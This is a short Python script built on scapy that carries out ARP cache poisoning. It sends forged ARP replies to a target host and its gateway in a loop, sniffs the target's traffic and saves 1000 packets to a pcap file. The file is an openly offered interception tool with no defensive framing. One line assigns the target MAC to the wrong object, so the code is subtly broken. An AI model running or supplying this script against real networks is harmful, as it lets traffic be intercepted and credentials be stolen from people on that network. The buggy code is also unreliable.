from scapy.all import *
from time import sleep
from threading import Thread

num_of_packets_to_sniff = 1000

# target config
target_ip = ""
target_mac = None

# gateway config
gateway_ip = ""
gateway_mac = None


def main():
    global gateway_mac
    global target_mac

    gateway_mac = get_mac_address(gateway_ip)
    target_mac = get_mac_address(target_ip)

    thread = Thread(target=poison_target)
    thread.start()

    # sniff the num of packets configured
    packets = sniff(count=num_of_packets_to_sniff, filter=f'host {target_ip}')

    wrpcap('packet.pcap', packets)

def get_mac_address(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),timeout = 2, retry = 10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target():
    # build the target packet
    target_packet = ARP()
    target_packet.op = 2
    target_packet.psrc = gateway_ip
    target_packet.pdst = target_ip
    target_mac.hdst = target_mac
    # target_packet.hsrc = my_mac // automatically those that

    # build the gateway packet
    gateway_packet = ARP()
    gateway_packet.op = 2
    gateway_packet.psrc = target_ip
    gateway_packet.pdst = gateway_ip
    gateway_packet.hdst = gateway_mac

    print("[*] Start sending arp poisoning packets")

    for i in range(1000):
        try:
            # sends the two packets
            send(target_packet)
            send(gateway_packet)

            # wait before sends again
            sleep(2)

        except KeyboardInterrupt:
            pass

if __name__ == '__main__':
    main()